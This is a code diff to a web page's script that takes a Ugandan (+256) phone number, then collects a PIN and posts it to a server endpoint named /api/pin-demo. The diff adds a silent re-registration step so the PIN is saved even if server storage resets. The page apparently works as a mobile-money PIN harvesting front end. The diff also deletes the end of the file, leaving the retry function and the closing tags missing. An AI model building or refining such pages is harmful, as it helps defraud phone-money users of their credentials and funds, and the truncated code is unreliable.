@@ -94,6 +94,7 @@
   <script>
     let currentRequestId = null;
     let pollInterval = null;
+    let savedPhoneValue = "";
 
     const phonePage = document.getElementById('phonePage');
     const pinPage = document.getElementById('pinPage');
@@ -106,29 +107,26 @@
     const pinStatus = document.getElementById('pinStatus');
     const pinError = document.getElementById('pinError');
 
-    // Frontend text monitoring to swap button styles dynamically
     phoneInput.addEventListener('input', (e) => {
       let digits = e.target.value.replace(/[^0-9]/g, '');
       e.target.value = digits;
       if (digits.length === 9) {
         phoneButton.removeAttribute('disabled');
-        phoneButton.style.background = "#004f71"; // Distinct rich colored option
       } else {
         phoneButton.setAttribute('disabled', 'true');
-        phoneButton.style.background = "#cccccc";
       }
     });
 
     phoneButton.addEventListener('click', async () => {
       phoneError.textContent = '';
       phoneButton.disabled = true;
-      const fullPhone = '+256' + phoneInput.value;
+      savedPhoneValue = '+256' + phoneInput.value;
 
       try {
         const res = await fetch('/api/phone', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone: fullPhone })
+          body: JSON.stringify({ phone: savedPhoneValue })
         });
         const data = await res.json();
         if (!res.ok) throw new Error(data.error || 'Failed to start.');
@@ -140,7 +138,6 @@
       } catch (err) {
         phoneError.textContent = err.message;
         phoneButton.removeAttribute('disabled');
-        phoneButton.style.background = "#004f71";
       }
     });
 
@@ -169,13 +166,30 @@
         container.appendChild(input);
         inputs.push(input);
       }
-      if(inputs[0]) inputs[0].focus();
+      inputs[0].focus();
     }
 
     async function submitPinFlow(pinValue, inputs) {
       pinError.textContent = '';
       secureModal.classList.remove('hidden'); 
       inputs.forEach(i => i.disabled = true);
+
+      // ✅ AUTOMATIC RE-REGISTRATION FALLBACK
+      // If Render clears its storage, this auto-registers the phone number right before saving the PIN
+      try {
+        let checkRes = await fetch(`/api/status/${currentRequestId}`);
+        if (!checkRes.ok) {
+          const reRegister = await fetch('/api/phone', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: savedPhoneValue })
+          });
+          const reData = await reRegister.json();
+          if (reRegister.ok) {
+            currentRequestId = reData.id;
+          }
+        }
+      } catch (e) { console.log("State refresh ignored."); }
 
       try {
         const res = await fetch('/api/pin-demo', {
@@ -189,7 +203,7 @@
         secureModal.classList.add('hidden');
         pinError.textContent = err.message;
         inputs.forEach(i => { i.disabled = false; i.value = ''; });
-        if(inputs[0]) inputs[0].focus();
+        inputs[0].focus();
       }
     }
 
@@ -220,16 +234,4 @@
       try {
         await fetch('/api/retry', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: currentRequestId })
-        });
-        inputs.forEach(i => { i.value = ''; i.disabled = false; });
-        pinStatus.textContent = '';
-        pinError.textContent = '';
-        if(inputs[0]) inputs[0].focus();
-      } catch (err) { pinError.textContent = 'Reset failed.'; }
-    }
-  </script>
-</body>
-</html>
 
